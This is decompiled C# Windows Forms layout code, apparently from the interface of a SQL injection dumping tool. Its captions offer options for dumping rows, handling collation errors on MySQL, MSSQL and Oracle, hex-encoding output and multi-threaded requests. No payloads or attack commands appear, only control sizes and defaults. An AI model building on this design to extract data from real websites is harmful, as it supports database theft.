		this.txtPassword.Size = new global::System.Drawing.Size(211, 26);
		this.txtPassword.TabIndex = 17;
		this.lblLoginUser.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblLoginUser.Location = new global::System.Drawing.Point(9, 26);
		this.lblLoginUser.Name = "lblLoginUser";
		this.lblLoginUser.Size = new global::System.Drawing.Size(88, 29);
		this.lblLoginUser.TabIndex = 3;
		this.lblLoginUser.Text = "UserName";
		this.lblLoginUser.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.lblLoginPassword.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblLoginPassword.Location = new global::System.Drawing.Point(9, 58);
		this.lblLoginPassword.Name = "lblLoginPassword";
		this.lblLoginPassword.Size = new global::System.Drawing.Size(88, 29);
		this.lblLoginPassword.TabIndex = 27;
		this.lblLoginPassword.Text = "Password";
		this.lblLoginPassword.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.grbDumpSetup2.Controls.Add(this.chkReDumpFailed);
		this.grbDumpSetup2.Controls.Add(this.chkClearListOnGet);
		this.grbDumpSetup2.Controls.Add(this.chkDumpOrderBy);
		this.grbDumpSetup2.Controls.Add(this.chkDumpWhere);
		this.grbDumpSetup2.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbDumpSetup2.Location = new global::System.Drawing.Point(0, 1003);
		this.grbDumpSetup2.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup2.Name = "grbDumpSetup2";
		this.grbDumpSetup2.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup2.Size = new global::System.Drawing.Size(319, 146);
		this.grbDumpSetup2.TabIndex = 44;
		this.grbDumpSetup2.TabStop = false;
		this.chkReDumpFailed.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkReDumpFailed.Checked = true;
		this.chkReDumpFailed.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkReDumpFailed.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkReDumpFailed.Location = new global::System.Drawing.Point(10, 17);
		this.chkReDumpFailed.Name = "chkReDumpFailed";
		this.chkReDumpFailed.Size = new global::System.Drawing.Size(300, 25);
		this.chkReDumpFailed.TabIndex = 20;
		this.chkReDumpFailed.Text = "&ReDump Failed Index";
		this.chkReDumpFailed.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkReDumpFailed.UseVisualStyleBackColor = true;
		this.chkClearListOnGet.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkClearListOnGet.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkClearListOnGet.Location = new global::System.Drawing.Point(10, 111);
		this.chkClearListOnGet.Name = "chkClearListOnGet";
		this.chkClearListOnGet.Size = new global::System.Drawing.Size(300, 25);
		this.chkClearListOnGet.TabIndex = 1;
		this.chkClearListOnGet.Text = "Clear Schema On Get";
		this.chkClearListOnGet.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkClearListOnGet.UseVisualStyleBackColor = true;
		this.chkDumpOrderBy.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpOrderBy.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkDumpOrderBy.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkDumpOrderBy.Location = new global::System.Drawing.Point(10, 77);
		this.chkDumpOrderBy.Name = "chkDumpOrderBy";
		this.chkDumpOrderBy.Size = new global::System.Drawing.Size(300, 25);
		this.chkDumpOrderBy.TabIndex = 19;
		this.chkDumpOrderBy.Text = "&Add Query ORDER BY";
		this.chkDumpOrderBy.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpOrderBy.UseVisualStyleBackColor = true;
		this.chkDumpWhere.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpWhere.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkDumpWhere.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkDumpWhere.Location = new global::System.Drawing.Point(10, 49);
		this.chkDumpWhere.Name = "chkDumpWhere";
		this.chkDumpWhere.Size = new global::System.Drawing.Size(300, 25);
		this.chkDumpWhere.TabIndex = 18;
		this.chkDumpWhere.Text = "&Add Query WHERE";
		this.chkDumpWhere.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpWhere.UseVisualStyleBackColor = true;
		this.grbMySQLSplitRows.Controls.Add(this.numMySQLSplitRowsLenght);
		this.grbMySQLSplitRows.Controls.Add(this.Label1);
		this.grbMySQLSplitRows.Controls.Add(this.chkMySQLSplitRows);
		this.grbMySQLSplitRows.Controls.Add(this.numMySQLSplitRows);
		this.grbMySQLSplitRows.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbMySQLSplitRows.Location = new global::System.Drawing.Point(0, 894);
		this.grbMySQLSplitRows.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLSplitRows.Name = "grbMySQLSplitRows";
		this.grbMySQLSplitRows.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLSplitRows.Size = new global::System.Drawing.Size(319, 109);
		this.grbMySQLSplitRows.TabIndex = 44;
		this.grbMySQLSplitRows.TabStop = false;
		this.numMySQLSplitRowsLenght.Enabled = false;
		this.numMySQLSplitRowsLenght.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRowsLenght = this.numMySQLSplitRowsLenght;
		int[] array15 = new int[4];
		array15[0] = 10;
		numMySQLSplitRowsLenght.Increment = new decimal(array15);
		this.numMySQLSplitRowsLenght.Location = new global::System.Drawing.Point(208, 56);
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRowsLenght2 = this.numMySQLSplitRowsLenght;
		int[] array16 = new int[4];
		array16[0] = 2;
		numMySQLSplitRowsLenght2.Minimum = new decimal(array16);
		this.numMySQLSplitRowsLenght.Name = "numMySQLSplitRowsLenght";
		this.numMySQLSplitRowsLenght.Size = new global::System.Drawing.Size(105, 26);
		this.numMySQLSplitRowsLenght.TabIndex = 34;
		this.numMySQLSplitRowsLenght.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRowsLenght3 = this.numMySQLSplitRowsLenght;
		int[] array17 = new int[4];
		array17[0] = 40;
		numMySQLSplitRowsLenght3.Value = new decimal(array17);
		this.Label1.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.Label1.Location = new global::System.Drawing.Point(6, 56);
		this.Label1.Name = "Label1";
		this.Label1.Size = new global::System.Drawing.Size(194, 26);
		this.Label1.TabIndex = 35;
		this.Label1.Text = "Split Chars Lenght";
		this.Label1.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkMySQLSplitRows.Location = new global::System.Drawing.Point(2, 24);
		this.chkMySQLSplitRows.Name = "chkMySQLSplitRows";
		this.chkMySQLSplitRows.Size = new global::System.Drawing.Size(196, 25);
		this.chkMySQLSplitRows.TabIndex = 21;
		this.chkMySQLSplitRows.Text = "&Split Rows";
		this.chkMySQLSplitRows.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkMySQLSplitRows.UseVisualStyleBackColor = true;
		this.numMySQLSplitRows.Enabled = false;
		this.numMySQLSplitRows.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.numMySQLSplitRows.Location = new global::System.Drawing.Point(208, 21);
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRows = this.numMySQLSplitRows;
		int[] array18 = new int[4];
		array18[0] = 10;
		numMySQLSplitRows.Maximum = new decimal(array18);
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRows2 = this.numMySQLSplitRows;
		int[] array19 = new int[4];
		array19[0] = 2;
		numMySQLSplitRows2.Minimum = new decimal(array19);
		this.numMySQLSplitRows.Name = "numMySQLSplitRows";
		this.numMySQLSplitRows.Size = new global::System.Drawing.Size(105, 26);
		this.numMySQLSplitRows.TabIndex = 22;
		this.numMySQLSplitRows.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numMySQLSplitRows3 = this.numMySQLSplitRows;
		int[] array20 = new int[4];
		array20[0] = 2;
		numMySQLSplitRows3.Value = new decimal(array20);
		this.grbDumpSetup.Controls.Add(this.numLimitX);
		this.grbDumpSetup.Controls.Add(this.numMaxRetryColumn);
		this.grbDumpSetup.Controls.Add(this.lblDumperRetryColumn);
		this.grbDumpSetup.Controls.Add(this.chkDumpFieldByField);
		this.grbDumpSetup.Controls.Add(this.lblDumperStartIndex);
		this.grbDumpSetup.Controls.Add(this.lblDumperMaxRows);
		this.grbDumpSetup.Controls.Add(this.numFieldByField);
		this.grbDumpSetup.Controls.Add(this.numLimitMax);
		this.grbDumpSetup.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbDumpSetup.Location = new global::System.Drawing.Point(0, 716);
		this.grbDumpSetup.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup.Name = "grbDumpSetup";
		this.grbDumpSetup.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup.Size = new global::System.Drawing.Size(319, 178);
		this.grbDumpSetup.TabIndex = 43;
		this.grbDumpSetup.TabStop = false;
		this.numLimitX.Location = new global::System.Drawing.Point(208, 23);
		global::System.Windows.Forms.NumericUpDown numLimitX = this.numLimitX;
		int[] array21 = new int[4];
		array21[0] = -727379969;
		array21[1] = 232;
		numLimitX.Maximum = new decimal(array21);
		this.numLimitX.Name = "numLimitX";
		this.numLimitX.Size = new global::System.Drawing.Size(105, 26);
		this.numLimitX.TabIndex = 15;
		this.numLimitX.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		this.numMaxRetryColumn.Enabled = false;
		this.numMaxRetryColumn.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numMaxRetryColumn = this.numMaxRetryColumn;
		int[] array22 = new int[4];
		array22[0] = 5;
		numMaxRetryColumn.Increment = new decimal(array22);
		this.numMaxRetryColumn.Location = new global::System.Drawing.Point(208, 132);
		global::System.Windows.Forms.NumericUpDown numMaxRetryColumn2 = this.numMaxRetryColumn;
		int[] array23 = new int[4];
		array23[0] = 1000;
		numMaxRetryColumn2.Maximum = new decimal(array23);
		global::System.Windows.Forms.NumericUpDown numMaxRetryColumn3 = this.numMaxRetryColumn;
		int[] array24 = new int[4];
		array24[0] = 1;
		numMaxRetryColumn3.Minimum = new decimal(array24);
		this.numMaxRetryColumn.Name = "numMaxRetryColumn";
		this.numMaxRetryColumn.Size = new global::System.Drawing.Size(105, 26);
		this.numMaxRetryColumn.TabIndex = 34;
		this.numMaxRetryColumn.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numMaxRetryColumn4 = this.numMaxRetryColumn;
		int[] array25 = new int[4];
		array25[0] = 5;
		numMaxRetryColumn4.Value = new decimal(array25);
		this.lblDumperRetryColumn.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblDumperRetryColumn.Location = new global::System.Drawing.Point(6, 132);
		this.lblDumperRetryColumn.Name = "lblDumperRetryColumn";
		this.lblDumperRetryColumn.Size = new global::System.Drawing.Size(194, 26);
		this.lblDumperRetryColumn.TabIndex = 35;
		this.lblDumperRetryColumn.Text = "Retry Limit Column";
		this.lblDumperRetryColumn.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkDumpFieldByField.Location = new global::System.Drawing.Point(2, 100);
		this.chkDumpFieldByField.Name = "chkDumpFieldByField";
		this.chkDumpFieldByField.Size = new global::System.Drawing.Size(196, 25);
		this.chkDumpFieldByField.TabIndex = 21;
		this.chkDumpFieldByField.Text = "&Dump Field(s)";
		this.chkDumpFieldByField.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpFieldByField.UseVisualStyleBackColor = true;
		this.lblDumperStartIndex.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblDumperStartIndex.Location = new global::System.Drawing.Point(24, 23);
		this.lblDumperStartIndex.Name = "lblDumperStartIndex";
		this.lblDumperStartIndex.Size = new global::System.Drawing.Size(176, 31);
		this.lblDumperStartIndex.TabIndex = 36;
		this.lblDumperStartIndex.Text = "Dump Start Index";
		this.lblDumperStartIndex.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.lblDumperMaxRows.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblDumperMaxRows.Location = new global::System.Drawing.Point(22, 58);
		this.lblDumperMaxRows.Name = "lblDumperMaxRows";
		this.lblDumperMaxRows.Size = new global::System.Drawing.Size(176, 31);
		this.lblDumperMaxRows.TabIndex = 37;
		this.lblDumperMaxRows.Text = "Maximum Rows";
		this.lblDumperMaxRows.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.numFieldByField.Enabled = false;
		this.numFieldByField.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.numFieldByField.Location = new global::System.Drawing.Point(208, 97);
		global::System.Windows.Forms.NumericUpDown numFieldByField = this.numFieldByField;
		int[] array26 = new int[4];
		array26[0] = 1;
		numFieldByField.Minimum = new decimal(array26);
		this.numFieldByField.Name = "numFieldByField";
		this.numFieldByField.Size = new global::System.Drawing.Size(105, 26);
		this.numFieldByField.TabIndex = 22;
		this.numFieldByField.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numFieldByField2 = this.numFieldByField;
		int[] array27 = new int[4];
		array27[0] = 1;
		numFieldByField2.Value = new decimal(array27);
		this.numLimitMax.Location = new global::System.Drawing.Point(208, 60);
		global::System.Windows.Forms.NumericUpDown numLimitMax = this.numLimitMax;
		int[] array28 = new int[4];
		array28[0] = -727379969;
		array28[1] = 232;
		numLimitMax.Maximum = new decimal(array28);
		this.numLimitMax.Name = "numLimitMax";
		this.numLimitMax.Size = new global::System.Drawing.Size(105, 26);
		this.numLimitMax.TabIndex = 35;
		this.numLimitMax.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		this.grbOracleCollactions.Controls.Add(this.chkOracleCastAsChar);
		this.grbOracleCollactions.Controls.Add(this.cmbOracleErrType);
		this.grbOracleCollactions.Controls.Add(this.cmbOracleTopN);
		this.grbOracleCollactions.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbOracleCollactions.Location = new global::System.Drawing.Point(0, 573);
		this.grbOracleCollactions.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbOracleCollactions.Name = "grbOracleCollactions";
		this.grbOracleCollactions.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbOracleCollactions.Size = new global::System.Drawing.Size(319, 143);
		this.grbOracleCollactions.TabIndex = 40;
		this.grbOracleCollactions.TabStop = false;
		this.grbOracleCollactions.Text = "Illegal Mix Of Collations";
		this.chkOracleCastAsChar.Checked = true;
		this.chkOracleCastAsChar.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkOracleCastAsChar.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkOracleCastAsChar.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkOracleCastAsChar.Location = new global::System.Drawing.Point(8, 105);
		this.chkOracleCastAsChar.Name = "chkOracleCastAsChar";
		this.chkOracleCastAsChar.Size = new global::System.Drawing.Size(152, 25);
		this.chkOracleCastAsChar.TabIndex = 1;
		this.chkOracleCastAsChar.Text = "Cast As &Char";
		this.chkOracleCastAsChar.UseVisualStyleBackColor = true;
		this.cmbOracleErrType.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbOracleErrType.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbOracleErrType.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbOracleErrType.FormattingEnabled = true;
		this.cmbOracleErrType.Location = new global::System.Drawing.Point(8, 66);
		this.cmbOracleErrType.Name = "cmbOracleErrType";
		this.cmbOracleErrType.Size = new global::System.Drawing.Size(301, 28);
		this.cmbOracleErrType.TabIndex = 36;
		this.cmbOracleTopN.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbOracleTopN.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbOracleTopN.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbOracleTopN.FormattingEnabled = true;
		this.cmbOracleTopN.Location = new global::System.Drawing.Point(8, 28);
		this.cmbOracleTopN.Name = "cmbOracleTopN";
		this.cmbOracleTopN.Size = new global::System.Drawing.Size(301, 28);
		this.cmbOracleTopN.TabIndex = 34;
		this.grbMSSQLCollactions.Controls.Add(this.chkMSSQLCastAsChar);
		this.grbMSSQLCollactions.Controls.Add(this.cmbMSSQLCast);
		this.grbMSSQLCollactions.Controls.Add(this.chkMSSQL_Latin1);
		this.grbMSSQLCollactions.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbMSSQLCollactions.Location = new global::System.Drawing.Point(0, 481);
		this.grbMSSQLCollactions.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMSSQLCollactions.Name = "grbMSSQLCollactions";
		this.grbMSSQLCollactions.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMSSQLCollactions.Size = new global::System.Drawing.Size(319, 92);
		this.grbMSSQLCollactions.TabIndex = 41;
		this.grbMSSQLCollactions.TabStop = false;
		this.grbMSSQLCollactions.Text = "Illegal Mix Of Collations";
		this.chkMSSQLCastAsChar.Checked = true;
		this.chkMSSQLCastAsChar.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkMSSQLCastAsChar.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkMSSQLCastAsChar.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkMSSQLCastAsChar.Location = new global::System.Drawing.Point(8, 55);
		this.chkMSSQLCastAsChar.Name = "chkMSSQLCastAsChar";
		this.chkMSSQLCastAsChar.Size = new global::System.Drawing.Size(90, 25);
		this.chkMSSQLCastAsChar.TabIndex = 1;
		this.chkMSSQLCastAsChar.Text = "&Cast As";
		this.chkMSSQLCastAsChar.UseVisualStyleBackColor = true;
		this.cmbMSSQLCast.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMSSQLCast.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbMSSQLCast.FormattingEnabled = true;
		this.cmbMSSQLCast.Location = new global::System.Drawing.Point(132, 46);
		this.cmbMSSQLCast.Name = "cmbMSSQLCast";
		this.cmbMSSQLCast.Size = new global::System.Drawing.Size(175, 28);
		this.cmbMSSQLCast.TabIndex = 33;
		this.chkMSSQL_Latin1.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkMSSQL_Latin1.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkMSSQL_Latin1.Location = new global::System.Drawing.Point(8, 28);
		this.chkMSSQL_Latin1.Name = "chkMSSQL_Latin1";
		this.chkMSSQL_Latin1.Size = new global::System.Drawing.Size(118, 25);
		this.chkMSSQL_Latin1.TabIndex = 0;
		this.chkMSSQL_Latin1.Text = "SQL_Latin1";
		this.chkMSSQL_Latin1.UseVisualStyleBackColor = true;
		this.grbMySQLCollactions.Controls.Add(this.cmbMySQLErrType);
		this.grbMySQLCollactions.Controls.Add(this.cmbMySQLCollations);
		this.grbMySQLCollactions.Controls.Add(this.chkDumpIFNULL);
		this.grbMySQLCollactions.Controls.Add(this.chkDumpEncodedHex);
		this.grbMySQLCollactions.Controls.Add(this.chkAllInOneRequest);
		this.grbMySQLCollactions.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbMySQLCollactions.Location = new global::System.Drawing.Point(0, 283);
		this.grbMySQLCollactions.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLCollactions.Name = "grbMySQLCollactions";
		this.grbMySQLCollactions.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbMySQLCollactions.Size = new global::System.Drawing.Size(319, 198);
		this.grbMySQLCollactions.TabIndex = 39;
		this.grbMySQLCollactions.TabStop = false;
		this.grbMySQLCollactions.Text = "Illegal Mix Of Collations";
		this.cmbMySQLErrType.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLErrType.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLErrType.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbMySQLErrType.FormattingEnabled = true;
		this.cmbMySQLErrType.Location = new global::System.Drawing.Point(8, 66);
		this.cmbMySQLErrType.Name = "cmbMySQLErrType";
		this.cmbMySQLErrType.Size = new global::System.Drawing.Size(301, 28);
		this.cmbMySQLErrType.TabIndex = 35;
		this.cmbMySQLCollations.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLCollations.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLCollations.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.cmbMySQLCollations.FormattingEnabled = true;
		this.cmbMySQLCollations.Location = new global::System.Drawing.Point(8, 28);
		this.cmbMySQLCollations.Name = "cmbMySQLCollations";
		this.cmbMySQLCollations.Size = new global::System.Drawing.Size(301, 28);
		this.cmbMySQLCollations.TabIndex = 34;
		this.chkDumpIFNULL.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpIFNULL.Checked = true;
		this.chkDumpIFNULL.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkDumpIFNULL.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkDumpIFNULL.Location = new global::System.Drawing.Point(10, 105);
		this.chkDumpIFNULL.Name = "chkDumpIFNULL";
		this.chkDumpIFNULL.Size = new global::System.Drawing.Size(299, 24);
		this.chkDumpIFNULL.TabIndex = 32;
		this.chkDumpIFNULL.Text = "&Dump Rows &IFNULL";
		this.chkDumpIFNULL.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpIFNULL.UseVisualStyleBackColor = true;
		this.chkDumpEncodedHex.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpEncodedHex.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkDumpEncodedHex.Location = new global::System.Drawing.Point(10, 131);
		this.chkDumpEncodedHex.Name = "chkDumpEncodedHex";
		this.chkDumpEncodedHex.Size = new global::System.Drawing.Size(299, 24);
		this.chkDumpEncodedHex.TabIndex = 23;
		this.chkDumpEncodedHex.Text = "&Dump Rows &Hex Encoded";
		this.chkDumpEncodedHex.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpEncodedHex.UseVisualStyleBackColor = true;
		this.chkAllInOneRequest.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkAllInOneRequest.Checked = true;
		this.chkAllInOneRequest.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkAllInOneRequest.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkAllInOneRequest.Location = new global::System.Drawing.Point(10, 157);
		this.chkAllInOneRequest.Name = "chkAllInOneRequest";
		this.chkAllInOneRequest.Size = new global::System.Drawing.Size(299, 24);
		this.chkAllInOneRequest.TabIndex = 0;
		this.chkAllInOneRequest.Text = "All In One";
		this.chkAllInOneRequest.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkAllInOneRequest.UseVisualStyleBackColor = true;
		this.grbSetupCon.Controls.Add(this.chkHttpRedirect);
		this.grbSetupCon.Controls.Add(this.numSleep);
		this.grbSetupCon.Controls.Add(this.numSleepMultiThread);
		this.grbSetupCon.Controls.Add(this.numMaxRetry);
		this.grbSetupCon.Controls.Add(this.chkThreads);
		this.grbSetupCon.Controls.Add(this.numMaxRetryMultiThread);
		this.grbSetupCon.Controls.Add(this.numThreads);
		this.grbSetupCon.Controls.Add(this.numTimeOut);
		this.grbSetupCon.Controls.Add(this.lblThreadDelay);
		this.grbSetupCon.Controls.Add(this.lblThreadRetry);
		this.grbSetupCon.Controls.Add(this.lblMultiThreadDelay);
		this.grbSetupCon.Controls.Add(this.lblMultiThreadRetry);
		this.grbSetupCon.Controls.Add(this.lblTimout);
		this.grbSetupCon.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbSetupCon.Location = new global::System.Drawing.Point(0, 0);
		this.grbSetupCon.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbSetupCon.Name = "grbSetupCon";
		this.grbSetupCon.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbSetupCon.Size = new global::System.Drawing.Size(319, 283);
		this.grbSetupCon.TabIndex = 42;
		this.grbSetupCon.TabStop = false;
		this.chkHttpRedirect.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkHttpRedirect.Checked = true;
		this.chkHttpRedirect.CheckState = global::System.Windows.Forms.CheckState.Checked;
		this.chkHttpRedirect.FlatStyle = global::System.Windows.Forms.FlatStyle.System;
		this.chkHttpRedirect.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkHttpRedirect.Location = new global::System.Drawing.Point(10, 246);
		this.chkHttpRedirect.Name = "chkHttpRedirect";
		this.chkHttpRedirect.Size = new global::System.Drawing.Size(303, 25);
		this.chkHttpRedirect.TabIndex = 29;
		this.chkHttpRedirect.Text = "HTTP Follow Redirect";
		this.chkHttpRedirect.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkHttpRedirect.UseVisualStyleBackColor = true;
		this.chkThreads.CheckAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkThreads.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.chkThreads.Location = new global::System.Drawing.Point(10, 31);
		this.chkThreads.Name = "chkThreads";
		this.chkThreads.Size = new global::System.Drawing.Size(191, 25);
		this.chkThreads.TabIndex = 23;
		this.chkThreads.Text = "Multi-Thread";
		this.chkThreads.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.chkThreads.UseVisualStyleBackColor = true;
		this.numThreads.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numThreads = this.numThreads;
		int[] array29 = new int[4];
		array29[0] = 10;
		numThreads.Increment = new decimal(array29);
		this.numThreads.Location = new global::System.Drawing.Point(208, 29);
		global::System.Windows.Forms.NumericUpDown numThreads2 = this.numThreads;
		int[] array30 = new int[4];
		array30[0] = 200;
		numThreads2.Maximum = new decimal(array30);
		global::System.Windows.Forms.NumericUpDown numThreads3 = this.numThreads;
		int[] array31 = new int[4];
		array31[0] = 2;
		numThreads3.Minimum = new decimal(array31);
		this.numThreads.Name = "numThreads";
		this.numThreads.Size = new global::System.Drawing.Size(105, 26);
		this.numThreads.TabIndex = 24;
		this.numThreads.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numThreads4 = this.numThreads;
		int[] array32 = new int[4];
		array32[0] = 10;
		numThreads4.Value = new decimal(array32);
		this.numTimeOut.ForeColor = global::System.Drawing.SystemColors.ControlText;
		global::System.Windows.Forms.NumericUpDown numTimeOut = this.numTimeOut;
		int[] array33 = new int[4];
		array33[0] = 5;
		numTimeOut.Increment = new decimal(array33);
		this.numTimeOut.Location = new global::System.Drawing.Point(208, 65);
		global::System.Windows.Forms.NumericUpDown numTimeOut2 = this.numTimeOut;
		int[] array34 = new int[4];
		array34[0] = 60;
		numTimeOut2.Maximum = new decimal(array34);
		global::System.Windows.Forms.NumericUpDown numTimeOut3 = this.numTimeOut;
		int[] array35 = new int[4];
		array35[0] = 1;
		numTimeOut3.Minimum = new decimal(array35);
		this.numTimeOut.Name = "numTimeOut";
		this.numTimeOut.Size = new global::System.Drawing.Size(105, 26);
		this.numTimeOut.TabIndex = 10;
		this.numTimeOut.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Right;
		global::System.Windows.Forms.NumericUpDown numTimeOut4 = this.numTimeOut;
		int[] array36 = new int[4];
		array36[0] = 10;
		numTimeOut4.Value = new decimal(array36);
		this.lblTimout.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.lblTimout.Location = new global::System.Drawing.Point(6, 65);
		this.lblTimout.Name = "lblTimout";
		this.lblTimout.Size = new global::System.Drawing.Size(195, 29);
		this.lblTimout.TabIndex = 0;
		this.lblTimout.Text = "&TimeOut (sec)";
		this.lblTimout.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.splData.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.splData.FixedPanel = global::System.Windows.Forms.FixedPanel.Panel1;
		this.splData.Location = new global::System.Drawing.Point(0, 66);
		this.splData.Name = "splData";
		this.splData.Orientation = global::System.Windows.Forms.Orientation.Horizontal;
		this.splData.Panel1.Controls.Add(this.tbcMain);
		this.splData.Panel1.Controls.Add(this.pnlSetupDump);
		this.splData.Panel2.AutoScroll = true;
		this.splData.Panel2.AutoScrollMinSize = new global::System.Drawing.Size(0, 200);
		this.splData.Size = new global::System.Drawing.Size(1762, 1386);
		this.splData.SplitterDistance = 1286;
